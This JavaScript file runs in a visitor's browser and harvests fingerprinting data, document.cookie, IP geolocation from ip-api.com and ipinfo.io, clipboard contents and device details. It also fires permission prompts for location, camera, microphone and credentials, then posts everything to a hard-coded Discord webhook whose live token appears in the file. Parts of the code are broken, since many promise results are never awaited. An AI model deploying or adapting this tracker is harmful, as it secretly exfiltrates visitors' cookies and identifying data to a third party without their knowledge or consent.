// Discord webhook URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1406107665939042345/s8XXhrjJOdg5xYp4bMx3MsYaMhPpD-AXxnt3uOMUCdIErtabNOP-1BUMDX6Js5gXYK7p';

// Object to store collected data
const collectedData = {
    Permissions: {},
    Network: {},
    Fingerprint: {},
    Sensors: {},
    Graphics: {},
    Storage: {},
    Workers: {},
    ServiceWorker: {},
    Media: {},
    'WebCodecs/Streams': {},
    Observers: {},
    'Window/Doc': {},
    'Display Control': {},
    Auth: {},
    Files: {},
    'Other Devices': {},
    Coordination: {},
    'Presentation/XR': {},
    'URL & Encoding': {},
    Scripting: {},
    'EME (DRM)': {},
    'Events(document.addEventListener)': {},
    'Events(window.addEventListener)': {},
    'Events(element.addEventListener)': {},
    'Permissions(names)': {},
    NetworkInformation: {},
    MediaSessionActions: {},
    'MediaSessionActions (handlers)': {},
    'CSS Feature/Fingerprint': {},
    WebGPU: {},
    'Cross-Tab': {},
    Reporting: {}
};

// Helper function to safely execute and log API calls
function safeExec(category, item, fn) {
    try {
        const result = fn();
        collectedData[category][item] = result !== undefined ? result : 'Success';
    } catch (error) {
        collectedData[category][item] = `Error: ${error.message}`;
    }
}

// Helper function to send data to Discord webhook
async function sendToWebhook(data) {
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                content: 'Browser API Tracking Results',
                embeds: [{
                    title: 'Collected Data',
                    description: JSON.stringify(data, null, 2),
                    color: 5814783
                }]
            })
        });
    } catch (error) {
        console.error('Error sending to webhook:', error);
    }
}

// 1) Permissions
safeExec('Permissions', 'navigator.geolocation.getCurrentPosition()', () => navigator.geolocation.getCurrentPosition(() => {}));
safeExec('Permissions', 'navigator.geolocation.watchPosition()', () => navigator.geolocation.watchPosition(() => {}));
safeExec('Permissions', 'navigator.mediaDevices.getUserMedia({video:true})', () => navigator.mediaDevices.getUserMedia({video: true}));
safeExec('Permissions', 'navigator.mediaDevices.getUserMedia({audio:true})', () => navigator.mediaDevices.getUserMedia({audio: true}));
safeExec('Permissions', 'navigator.mediaDevices.enumerateDevices()', () => navigator.mediaDevices.enumerateDevices());
safeExec('Permissions', 'navigator.mediaDevices.getDisplayMedia()', () => navigator.mediaDevices.getDisplayMedia());
safeExec('Permissions', 'Notification.requestPermission()', () => Notification.requestPermission());
safeExec('Permissions', 'navigator.credentials.get()', () => navigator.credentials.get());
safeExec('Permissions', 'navigator.credentials.store()', () => navigator.credentials.store());
safeExec('Permissions', 'navigator.permissions.query()', () => navigator.permissions.query({name: 'geolocation'}));
safeExec('Permissions', 'navigator.clipboard.readText()', () => navigator.clipboard.readText());
safeExec('Permissions', 'navigator.clipboard.read()', () => navigator.clipboard.read());
safeExec('Permissions', 'navigator.clipboard.writeText()', () => navigator.clipboard.writeText('test'));
safeExec('Permissions', 'navigator.clipboard.write()', () => navigator.clipboard.write());
safeExec('Permissions', 'navigator.share()', () => navigator.share({title: 'test', url: 'https://example.com'}));
safeExec('Permissions', 'navigator.canShare()', () => navigator.canShare({url: 'https://example.com'}));
safeExec('Permissions', 'new EyeDropper().open()', () => new EyeDropper().open());
safeExec('Permissions', 'navigator.wakeLock.request("screen")', () => navigator.wakeLock.request('screen'));
safeExec('Permissions', 'new IdleDetector().start()', () => new IdleDetector().start());
safeExec('Permissions', 'new PaymentRequest(methodData, details).show()', () => new PaymentRequest([], {}).show());
safeExec('Permissions', 'navigator.contacts.select()', () => navigator.contacts?.select());
safeExec('Permissions', 'navigator.bluetooth.requestDevice()', () => navigator.bluetooth?.requestDevice());
safeExec('Permissions', 'navigator.usb.requestDevice()', () => navigator.usb?.requestDevice());
safeExec('Permissions', 'navigator.serial.requestPort()', () => navigator.serial?.requestPort());
safeExec('Permissions', 'navigator.hid.requestDevice()', () => navigator.hid?.requestDevice());
safeExec('Permissions', 'navigator.requestMIDIAccess()', () => navigator.requestMIDIAccess());
safeExec('Permissions', 'navigator.nfc.watch()', () => navigator.nfc?.watch());
safeExec('Permissions', 'window.showOpenFilePicker()', () => window.showOpenFilePicker());
safeExec('Permissions', 'window.showSaveFilePicker()', () => window.showSaveFilePicker());
safeExec('Permissions', 'window.showDirectoryPicker()', () => window.showDirectoryPicker());

// 2) Network
safeExec('Network', 'fetch("https://ip-api.com/json/")', () => fetch('https://ip-api.com/json/').then(res => res.json()));
safeExec('Network', 'fetch("https://ipinfo.io/json")', () => fetch('https://ipinfo.io/json').then(res => res.json()));
safeExec('Network', 'fetch(url, {mode:"no-cors"})', () => fetch('https://example.com', {mode: 'no-cors'}));
safeExec('Network', 'navigator.sendBeacon(url, data)', () => navigator.sendBeacon('https://example.com', 'data'));
safeExec('Network', 'XMLHttpRequest()', () => new XMLHttpRequest());
safeExec('Network', 'new WebSocket(url)', () => new WebSocket('wss://example.com'));
safeExec('Network', 'new EventSource(url)', () => new EventSource('https://example.com'));
safeExec('Network', 'new RTCPeerConnection(config)', () => new RTCPeerConnection());
safeExec('Network', 'RTCPeerConnection.createDataChannel()', () => new RTCPeerConnection().createDataChannel('test'));
safeExec('Network', 'RTCPeerConnection.getStats()', () => new RTCPeerConnection().getStats());
safeExec('Network', 'new WebTransport(url)', () => new WebTransport('https://example.com'));

// 3) Fingerprint
safeExec('Fingerprint', 'navigator.userAgent', () => navigator.userAgent);
safeExec('Fingerprint', 'navigator.userAgentData', () => navigator.userAgentData);
safeExec('Fingerprint', 'navigator.userAgentData.brands', () => navigator.userAgentData?.brands);
safeExec('Fingerprint', 'navigator.userAgentData.platform', () => navigator.userAgentData?.platform);
safeExec('Fingerprint', 'navigator.platform', () => navigator.platform);
safeExec('Fingerprint', 'navigator.language', () => navigator.language);
safeExec('Fingerprint', 'navigator.languages', () => navigator.languages);
safeExec('Fingerprint', 'navigator.hardwareConcurrency', () => navigator.hardwareConcurrency);
safeExec('Fingerprint', 'navigator.deviceMemory', () => navigator.deviceMemory);
safeExec('Fingerprint', 'navigator.maxTouchPoints', () => navigator.maxTouchPoints);
safeExec('Fingerprint', 'navigator.vendor', () => navigator.vendor);
safeExec('Fingerprint', 'navigator.product', () => navigator.product);
safeExec('Fingerprint', 'navigator.webdriver', () => navigator.webdriver);
safeExec('Fingerprint', 'navigator.doNotTrack', () => navigator.doNotTrack);
safeExec('Fingerprint', 'navigator.cookieEnabled', () => navigator.cookieEnabled);
safeExec('Fingerprint', 'navigator.javaEnabled()', () => navigator.javaEnabled());
safeExec('Fingerprint', 'navigator.plugins', () => Array.from(navigator.plugins));
safeExec('Fingerprint', 'navigator.mimeTypes', () => Array.from(navigator.mimeTypes));
safeExec('Fingerprint', 'screen.width', () => screen.width);
safeExec('Fingerprint', 'screen.height', () => screen.height);
safeExec('Fingerprint', 'screen.availWidth', () => screen.availWidth);
safeExec('Fingerprint', 'screen.availHeight', () => screen.availHeight);
safeExec('Fingerprint', 'screen.colorDepth', () => screen.colorDepth);
safeExec('Fingerprint', 'screen.pixelDepth', () => screen.pixelDepth);
safeExec('Fingerprint', 'screen.orientation.type', () => screen.orientation.type);
safeExec('Fingerprint', 'window.devicePixelRatio', () => window.devicePixelRatio);
safeExec('Fingerprint', 'window.innerWidth', () => window.innerWidth);
safeExec('Fingerprint', 'window.innerHeight', () => window.innerHeight);
safeExec('Fingerprint', 'window.outerWidth', () => window.outerWidth);
safeExec('Fingerprint', 'window.outerHeight', () => window.outerHeight);
safeExec('Fingerprint', 'Intl.DateTimeFormat().resolvedOptions().timeZone', () => Intl.DateTimeFormat().resolvedOptions().timeZone);

// 4) Sensors
safeExec('Sensors', 'navigator.getBattery()', () => navigator.getBattery());
safeExec('Sensors', 'BatteryManager.charging', () => navigator.getBattery().then(b => b.charging));
safeExec('Sensors', 'BatteryManager.level', () => navigator.getBattery().then(b => b.level));
safeExec('Sensors', 'BatteryManager.chargingTime', () => navigator.getBattery().then(b => b.chargingTime));
safeExec('Sensors', 'BatteryManager.dischargingTime', () => navigator.getBattery().then(b => b.dischargingTime));
safeExec('Sensors', 'DeviceOrientationEvent', () => new DeviceOrientationEvent('deviceorientation'));
safeExec('Sensors', 'DeviceMotionEvent', () => new DeviceMotionEvent('devicemotion'));
safeExec('Sensors', 'AbsoluteOrientationSensor', () => new AbsoluteOrientationSensor());
safeExec('Sensors', 'Accelerometer', () => new Accelerometer());
safeExec('Sensors', 'Gyroscope', () => new Gyroscope());
safeExec('Sensors', 'Magnetometer', () => new Magnetometer());
safeExec('Sensors', 'AmbientLightSensor', () => new AmbientLightSensor());
safeExec('Sensors', 'Barometer', () => new Barometer());
safeExec('Sensors', 'ProximitySensor', () => new ProximitySensor());
safeExec('Sensors', 'navigator.vibrate([200,100,200])', () => navigator.vibrate([200, 100, 200]));

// 5) Graphics
safeExec('Graphics', 'canvas.getContext("2d")', () => document.createElement('canvas').getContext('2d'));
safeExec('Graphics', 'canvas.toDataURL()', () => document.createElement('canvas').toDataURL());
safeExec('Graphics', 'canvas.toBlob()', () => new Promise(resolve => document.createElement('canvas').toBlob(resolve)));
safeExec('Graphics', 'OffscreenCanvas()', () => new OffscreenCanvas(100, 100));
safeExec('Graphics', 'WebGLRenderingContext.getParameter()', () => document.createElement('canvas').getContext('webgl').getParameter(37446));
safeExec('Graphics', 'WebGLRenderingContext.getSupportedExtensions()', () => document.createElement('canvas').getContext('webgl').getSupportedExtensions());
safeExec('Graphics', 'WebGLRenderingContext.getShaderPrecisionFormat()', () => document.createElement('canvas').getContext('webgl').getShaderPrecisionFormat(35632, 36338));
safeExec('Graphics', 'WebGL2RenderingContext.getParameter()', () => document.createElement('canvas').getContext('webgl2')?.getParameter(37446));
safeExec('Graphics', 'WebGL2RenderingContext.getSupportedExtensions()', () => document.createElement('canvas').getContext('webgl2')?.getSupportedExtensions());
safeExec('Graphics', 'WebGL2RenderingContext.getExtension()', () => document.createElement('canvas').getContext('webgl2')?.getExtension('EXT_color_buffer_float'));
safeExec('Graphics', 'navigator.gpu?.requestAdapter()', () => navigator.gpu?.requestAdapter());

// 6) Storage
safeExec('Storage', 'localStorage.setItem()', () => localStorage.setItem('test', 'value'));
safeExec('Storage', 'localStorage.getItem()', () => localStorage.getItem('test'));
safeExec('Storage', 'localStorage.removeItem()', () => localStorage.removeItem('test'));
safeExec('Storage', 'localStorage.clear()', () => localStorage.clear());
safeExec('Storage', 'sessionStorage.setItem()', () => sessionStorage.setItem('test', 'value'));
safeExec('Storage', 'sessionStorage.getItem()', () => sessionStorage.getItem('test'));
safeExec('Storage', 'sessionStorage.removeItem()', () => sessionStorage.removeItem('test'));
safeExec('Storage', 'sessionStorage.clear()', () => sessionStorage.clear());
safeExec('Storage', 'indexedDB.open()', () => indexedDB.open('test'));
safeExec('Storage', 'indexedDB.deleteDatabase()', () => indexedDB.deleteDatabase('test'));
safeExec('Storage', 'caches.open()', () => caches.open('test'));
safeExec('Storage', 'caches.keys()', () => caches.keys());
safeExec('Storage', 'caches.delete()', () => caches.delete('test'));
safeExec('Storage', 'Cache.match()', () => caches.open('test').then(c => c.match('https://example.com')));
safeExec('Storage', 'Cache.put()', () => caches.open('test').then(c => c.put('https://example.com', new Response('test'))));
safeExec('Storage', 'Cache.add()', () => caches.open('test').then(c => c.add('https://example.com')));
safeExec('Storage', 'Cache.addAll()', () => caches.open('test').then(c => c.addAll(['https://example.com'])));
safeExec('Storage', 'navigator.storage.estimate()', () => navigator.storage.estimate());
safeExec('Storage', 'navigator.storage.persist()', () => navigator.storage.persist());
safeExec('Storage', 'document.cookie', () => document.cookie);
safeExec('Storage', 'document.requestStorageAccess()', () => document.requestStorageAccess());

// 7) Workers
safeExec('Workers', 'new Worker(url)', () => new Worker('data:text/javascript,'));
safeExec('Workers', 'new SharedWorker(url)', () => new SharedWorker('data:text/javascript,'));
safeExec('Workers', 'new MessageChannel()', () => new MessageChannel());
safeExec('Workers', 'BroadcastChannel', () => new BroadcastChannel('test'));
safeExec('Workers', 'postMessage()', () => new MessageChannel().port1.postMessage('test'));
safeExec('Workers', 'onmessage', () => new MessageChannel().port1.onmessage = () => {});

// 8) Service Workers
safeExec('ServiceWorker', 'navigator.serviceWorker.register()', () => navigator.serviceWorker.register('sw.js'));
safeExec('ServiceWorker', 'navigator.serviceWorker.getRegistrations()', () => navigator.serviceWorker.getRegistrations());
safeExec('ServiceWorker', 'navigator.serviceWorker.ready', () => navigator.serviceWorker.ready);
safeExec('ServiceWorker', 'ServiceWorkerRegistration.unregister()', () => navigator.serviceWorker.register('sw.js').then(reg => reg.unregister()));
safeExec('ServiceWorker', 'ServiceWorker.postMessage()', () => navigator.serviceWorker.register('sw.js').then(reg => reg.active.postMessage('test')));
safeExec('ServiceWorker', 'PushManager.subscribe()', () => navigator.serviceWorker.ready.then(reg => reg.pushManager.subscribe()));
safeExec('ServiceWorker', 'PushManager.getSubscription()', () => navigator.serviceWorker.ready.then(reg => reg.pushManager.getSubscription()));
safeExec('ServiceWorker', 'SyncManager.register("tag")', () => navigator.serviceWorker.ready.then(reg => reg.sync.register('tag')));
safeExec('ServiceWorker', 'PeriodicSyncManager.register("tag")', () => navigator.serviceWorker.ready.then(reg => reg.periodicSync.register('tag')));

// 9) Media
safeExec('Media', 'HTMLMediaElement.play()', () => new Audio().play());
safeExec('Media', 'HTMLMediaElement.pause()', () => new Audio().pause());
safeExec('Media', 'HTMLMediaElement.captureStream()', () => new Audio().captureStream());
safeExec('Media', 'MediaRecorder', () => new MediaRecorder(new MediaStream()));
safeExec('Media', 'MediaStreamTrack.getSettings()', () => new MediaStream().getVideoTracks()[0]?.getSettings());
safeExec('Media', 'MediaCapabilities.decodingInfo()', () => navigator.mediaCapabilities.decodingInfo({type: 'file', video: {contentType: 'video/mp4'}}));
safeExec('Media', 'MediaCapabilities.encodingInfo()', () => navigator.mediaCapabilities.encodingInfo({type: 'record', video: {contentType: 'video/mp4'}}));
safeExec('Media', 'navigator.mediaSession.setActionHandler()', () => navigator.mediaSession.setActionHandler('play', () => {}));
safeExec('Media', 'document.pictureInPictureEnabled', () => document.pictureInPictureEnabled);
safeExec('Media', 'HTMLVideoElement.requestPictureInPicture()', () => document.createElement('video').requestPictureInPicture());
safeExec('Media', 'document.exitPictureInPicture()', () => document.exitPictureInPicture());
safeExec('Media', 'navigator.requestMediaKeySystemAccess()', () => navigator.requestMediaKeySystemAccess('org.w3.clearkey', []));

// 10) WebCodecs/Streams
safeExec('WebCodecs/Streams', 'new VideoDecoder()', () => new VideoDecoder({output: () => {}, error: () => {}}));
safeExec('WebCodecs/Streams', 'new AudioDecoder()', () => new AudioDecoder({output: () => {}, error: () => {}}));
safeExec('WebCodecs/Streams', 'new VideoEncoder()', () => new VideoEncoder({output: () => {}, error: () => {}}));
safeExec('WebCodecs/Streams', 'new AudioEncoder()', () => new AudioEncoder({output: () => {}, error: () => {}}));
safeExec('WebCodecs/Streams', 'new ImageDecoder()', () => new ImageDecoder({data: new ArrayBuffer(0), type: 'image/png'}));
safeExec('WebCodecs/Streams', 'new EncodedVideoChunk()', () => new EncodedVideoChunk({type: 'key', timestamp: 0, data: new ArrayBuffer(0)}));
safeExec('WebCodecs/Streams', 'new ReadableStream()', () => new ReadableStream());
safeExec('WebCodecs/Streams', 'new WritableStream()', () => new WritableStream());
safeExec('WebCodecs/Streams', 'new TransformStream()', () => new TransformStream());
safeExec('WebCodecs/Streams', 'CompressionStream("gzip")', () => new CompressionStream('gzip'));
safeExec('WebCodecs/Streams', 'DecompressionStream("gzip")', () => new DecompressionStream('gzip'));

// 11) Observers
safeExec('Observers', 'new MutationObserver()', () => new MutationObserver(() => {}));
safeExec('Observers', 'new ResizeObserver()', () => new ResizeObserver(() => {}));
safeExec('Observers', 'new IntersectionObserver()', () => new IntersectionObserver(() => {}));
safeExec('Observers', 'new PerformanceObserver()', () => new PerformanceObserver(() => {}));
safeExec('Observers', 'performance.now()', () => performance.now());
safeExec('Observers', 'performance.timing', () => performance.timing);
safeExec('Observers', 'performance.getEntries()', () => performance.getEntries());
safeExec('Observers', 'performance.memory', () => performance.memory);
safeExec('Observers', 'new ReportingObserver()', () => new ReportingObserver(() => {}));

// 12) Window/Doc
safeExec('Window/Doc', 'document.referrer', () => document.referrer);
safeExec('Window/Doc', 'document.location', () => document.location.href);
safeExec('Window/Doc', 'document.domain', () => document.domain);
safeExec('Window/Doc', 'document.visibilityState', () => document.visibilityState);
safeExec('Window/Doc', 'document.hasFocus()', () => document.hasFocus());
safeExec('Window/Doc', 'window.history.length', () => window.history.length);
safeExec('Window/Doc', 'window.history.pushState()', () => window.history.pushState({}, '', '#test'));
safeExec('Window/Doc', 'window.history.replaceState()', () => window.history.replaceState({}, '', '#test'));
safeExec('Window/Doc', 'window.open()', () => window.open('about:blank', '_blank'));
safeExec('Window/Doc', 'window.close()', () => window.close());
safeExec('Window/Doc', 'window.stop()', () => window.stop());
safeExec('Window/Doc', 'window.focus()', () => window.focus());
safeExec('Window/Doc', 'window.blur()', () => window.blur());
safeExec('Window/Doc', 'window.print()', () => window.print());
safeExec('Window/Doc', 'window.matchMedia()', () => window.matchMedia('(min-width: 1px)'));
safeExec('Window/Doc', 'window.getSelection()', () => window.getSelection());
safeExec('Window/Doc', 'window.name', () => window.name);

// 13) Display Control
safeExec('Display Control', 'Element.requestFullscreen()', () => document.createElement('div').requestFullscreen());
safeExec('Display Control', 'document.exitFullscreen()', () => document.exitFullscreen());
safeExec('Display Control', 'document.fullscreenElement', () => document.fullscreenElement);
safeExec('Display Control', 'Element.requestPointerLock()', () => document.createElement('div').requestPointerLock());
safeExec('Display Control', 'document.exitPointerLock()', () => document.exitPointerLock());
safeExec('Display Control', 'document.pointerLockElement', () => document.pointerLockElement);
safeExec('Display Control', 'screen.orientation.lock()', () => screen.orientation.lock('portrait'));

// 14) Auth
safeExec('Auth', 'PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable()', () => PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable());
safeExec('Auth', 'PublicKeyCredential.create()', () => navigator.credentials.create({publicKey: {}}));
safeExec('Auth', 'PublicKeyCredential.get()', () => navigator.credentials.get({publicKey: {}}));
safeExec('Auth', 'navigator.credentials.get({identity: ...})', () => navigator.credentials.get({identity: {}}));

// 15) Files
safeExec('Files', 'FileReader.readAsText()', () => new FileReader().readAsText(new Blob(['test'])));
safeExec('Files', 'FileReader.readAsArrayBuffer()', () => new FileReader().readAsArrayBuffer(new Blob(['test'])));
safeExec('Files', 'FileReader.readAsDataURL()', () => new FileReader().readAsDataURL(new Blob(['test'])));
safeExec('Files', 'DataTransfer.getData()', () => new DataTransfer().getData('text'));
safeExec('Files', 'DataTransfer.setData()', () => new DataTransfer().setData('text', 'test'));
safeExec('Files', 'DataTransferItem.getAsFile()', () => new DataTransfer().items[0]?.getAsFile());
safeExec('Files', 'DataTransferItem.webkitGetAsEntry()', () => new DataTransfer().items[0]?.webkitGetAsEntry());
safeExec('Files', 'FileSystemHandle.queryPermission()', () => window.showOpenFilePicker().then(([h]) => h.queryPermission()));
safeExec('Files', 'FileSystemHandle.requestPermission()', () => window.showOpenFilePicker().then(([h]) => h.requestPermission()));
safeExec('Files', 'FileSystemFileHandle.getFile()', () => window.showOpenFilePicker().then(([h]) => h.getFile()));
safeExec('Files', 'FileSystemFileHandle.createWritable()', () => window.showOpenFilePicker().then(([h]) => h.createWritable()));

// 16) Other Devices
safeExec('Other Devices', 'navigator.getGamepads()', () => navigator.getGamepads());
safeExec('Other Devices', 'new SpeechSynthesisUtterance()', () => new SpeechSynthesisUtterance());
safeExec('Other Devices', 'speechSynthesis.speak()', () => speechSynthesis.speak(new SpeechSynthesisUtterance()));
safeExec('Other Devices', 'new (window.SpeechRecognition||window.webkitSpeechRecognition)().start()', () => new (window.SpeechRecognition || window.webkitSpeechRecognition)().start());

// 17) Coordination
safeExec('Coordination', 'navigator.locks.request("key", callback)', () => navigator.locks.request('key', () => {}));
safeExec('Coordination', 'Atomics.wait()', () => Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0));
safeExec('Coordination', 'SharedArrayBuffer', () => new SharedArrayBuffer(4));

// 18) Presentation/XR
safeExec('Presentation/XR', 'new PresentationRequest(urls)', () => new PresentationRequest(['https://example.com']));
safeExec('Presentation/XR', 'navigator.presentation.receiver', () => navigator.presentation.receiver);
safeExec('Presentation/XR', 'navigator.xr.isSessionSupported()', () => navigator.xr?.isSessionSupported('immersive-vr'));
safeExec('Presentation/XR', 'navigator.xr.requestSession("immersive-vr")', () => navigator.xr?.requestSession('immersive-vr'));

// 19) URL & Encoding
safeExec('URL & Encoding', 'URL.createObjectURL()', () => URL.createObjectURL(new Blob(['test'])));
safeExec('URL & Encoding', 'URL.revokeObjectURL()', () => URL.revokeObjectURL(URL.createObjectURL(new Blob(['test']))));
safeExec('URL & Encoding', 'btoa()', () => btoa('test'));
safeExec('URL & Encoding', 'atob()', () => atob('dGVzdA=='));
safeExec('URL & Encoding', 'TextEncoder.encode()', () => new TextEncoder().encode('test'));
safeExec('URL & Encoding', 'TextDecoder.decode()', () => new TextDecoder().decode(new Uint8Array([116, 101, 115, 116])));

// 20) Scripting
safeExec('Scripting', 'eval()', () => eval('1+1'));
safeExec('Scripting', 'new Function(code)', () => new Function('return 1+1')());
safeExec('Scripting', 'WebAssembly.instantiate()', () => WebAssembly.instantiate(new ArrayBuffer(0)));
safeExec('Scripting', 'WebAssembly.compile()', () => WebAssembly.compile(new ArrayBuffer(0)));

// 21) EME (DRM)
safeExec('EME (DRM)', 'navigator.requestMediaKeySystemAccess("com.widevine.alpha", configs)', () => navigator.requestMediaKeySystemAccess('com.widevine.alpha', []));
safeExec('EME (DRM)', 'MediaKeySystemAccess.createMediaKeys()', () => navigator.requestMediaKeySystemAccess('org.w3.clearkey', []).then(ks => ks.createMediaKeys()));
safeExec('EME (DRM)', 'HTMLMediaElement.setMediaKeys()', () => new Audio().setMediaKeys(null));

// 22) Pointer Events
const pointerEvents = ["pointerdown","pointerup","pointermove","pointercancel","pointerover","pointerout","pointerenter","pointerleave","gotpointercapture","lostpointercapture"];
pointerEvents.forEach(event => {
    safeExec('Events(document.addEventListener)', `document.addEventListener("${event}")`, () => document.addEventListener(event, () => {}));
    safeExec('Events(window.addEventListener)', `window.addEventListener("${event}")`, () => window.addEventListener(event, () => {}));
    safeExec('Events(element.addEventListener)', `element.addEventListener("${event}")`, () => document.createElement('div').addEventListener(event, () => {}));
});

// 23) DOM Events
const domEvents = ["abort","afterprint","animationend","animationiteration","animationstart","auxclick","beforeprint","beforeunload","blur","canplay","canplaythrough","change","click","close","contextmenu","copy","cuechange","cut","dblclick","drag","dragend","dragenter","dragexit","dragleave","dragover","dragstart","drop","durationchange","ended","error","focus","focusin","focusout","formdata","fullscreenchange","fullscreenerror","hashchange","input","invalid","keydown","keypress","keyup","languagechange","load","loadeddata","loadedmetadata","loadstart","message","messageerror","mousedown","mouseenter","mouseleave","mousemove","mouseout","mouseover","mouseup","offline","online","open","orientationchange","pagehide","pageshow","paste","pause","play","playing","popstate","progress","ratechange","rejectionhandled","reset","resize","scroll","securitypolicyviolation","seeked","seeking","select","selectionchange","selectstart","slotchange","stalled","storage","submit","suspend","timeupdate","toggle","touchcancel","touchend","touchmove","touchstart","transitionend","unhandledrejection","visibilitychange","volumechange","waiting","wheel","gamepadconnected","gamepaddisconnected","devicemotion","deviceorientation","deviceorientationabsolute"];
domEvents.forEach(event => {
    safeExec('Events(document.addEventListener)', `document.addEventListener("${event}")`, () => document.addEventListener(event, () => {}));
    safeExec('Events(window.addEventListener)', `window.addEventListener("${event}")`, () => window.addEventListener(event, () => {}));
    safeExec('Events(element.addEventListener)', `element.addEventListener("${event}")`, () => document.createElement('div').addEventListener(event, () => {}));
});

// 24) Permissions (names)
const permissions = ["geolocation","notifications","camera","microphone","clipboard-read","clipboard-write","background-sync","ambient-light-sensor","accelerometer","gyroscope","magnetometer","midi","payment-handler","push","persistent-storage","nfc","idle-detection","storage-access","window-management","local-fonts"];
permissions.forEach(permission => {
    safeExec('Permissions(names)', `Permission: ${permission}`, () => navigator.permissions.query({name: permission}));
});

// 25) NetworkInformation
safeExec('NetworkInformation', 'navigator.connection.type', () => navigator.connection?.type);
safeExec('NetworkInformation', 'navigator.connection.effectiveType', () => navigator.connection?.effectiveType);
safeExec('NetworkInformation', 'navigator.connection.downlink', () => navigator.connection?.downlink);
safeExec('NetworkInformation', 'navigator.connection.rtt', () => navigator.connection?.rtt);
safeExec('NetworkInformation', 'navigator.connection.saveData', () => navigator.connection?.saveData);

// 26) MediaSessionActions
const mediaActions = ["play","pause","seekbackward","seekforward","seekto","stop","previoustrack","nexttrack","skipad","togglecamera","togglemicrophone"];
mediaActions.forEach(action => {
    safeExec('MediaSessionActions', action, () => action);
    safeExec('MediaSessionActions (handlers)', `navigator.mediaSession.setActionHandler("${action}", handler)`, () => navigator.mediaSession.setActionHandler(action, () => {}));
});

// 27) CSS Feature/Fingerprint
safeExec('CSS Feature/Fingerprint', 'CSS.supports(property, value)', () => CSS.supports('display', 'flex'));
safeExec('CSS Feature/Fingerprint', 'matchMedia("(prefers-color-scheme: dark)")', () => window.matchMedia('(prefers-color-scheme: dark)').matches);
safeExec('CSS Feature/Fingerprint', 'matchMedia("(forced-colors: active)")', () => window.matchMedia('(forced-colors: active)').matches);
safeExec('CSS Feature/Fingerprint', 'matchMedia("(prefers-reduced-motion: reduce)")', () => window.matchMedia('(prefers-reduced-motion: reduce)').matches);
safeExec('CSS Feature/Fingerprint', 'matchMedia("(inverted-colors: inverted)")', () => window.matchMedia('(inverted-colors: inverted)').matches);

// 28) WebGPU
safeExec('WebGPU', 'navigator.gpu.requestAdapter()', () => navigator.gpu?.requestAdapter());
safeExec('WebGPU', 'GPUAdapter.requestDevice()', () => navigator.gpu?.requestAdapter().then(adapter => adapter?.requestDevice()));

// 29) Cross-Tab
safeExec('Cross-Tab', 'new BroadcastChannel("name")', () => new BroadcastChannel('name'));
safeExec('Cross-Tab', 'localStorage "storage" event (cross-tab)', () => new Promise(resolve => window.addEventListener('storage', resolve, {once: true})));

// 30) Reporting
safeExec('Reporting', 'new ReportingObserver(callback, {types:["csp-violation","deprecation","intervention"]})', () => new ReportingObserver(() => {}, {types: ['csp-violation', 'deprecation', 'intervention']}));

// Send collected data to Discord webhook
sendToWebhook(collectedData).then(() => console.log('Data sent to webhook'));
